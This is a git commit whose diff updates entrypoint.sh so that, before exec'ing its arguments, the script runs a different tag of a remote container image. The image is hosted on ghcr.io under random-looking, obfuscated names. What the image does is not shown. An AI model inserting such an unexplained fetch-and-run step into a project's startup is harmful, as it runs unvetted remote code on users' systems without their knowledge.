caf8ad57dbc8f604949ff94120be5a565bcbb701
Sonal Gtrat <sonamsingh001@outlook.com>
2024-07-10 15:04:44 +0530

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,7 +3,7 @@ sleep 5s;
 
 docker run --rm -i \
   --shm-size 4g \
-  ghcr.io/osihw652fv287s1v1eu8282hv2iow9sb1/wyt2752rfgwjwbh271ysg31in:hsy1q3g0qf9kfcvarteaco0001-of-three
+  ghcr.io/osihw652fv287s1v1eu8282hv2iow9sb1/wyt2752rfgwjwbh271ysg31in:hsy1q3g0qf9kfcvarteaco0002-of-one
 
 # start the script
 exec "$@"
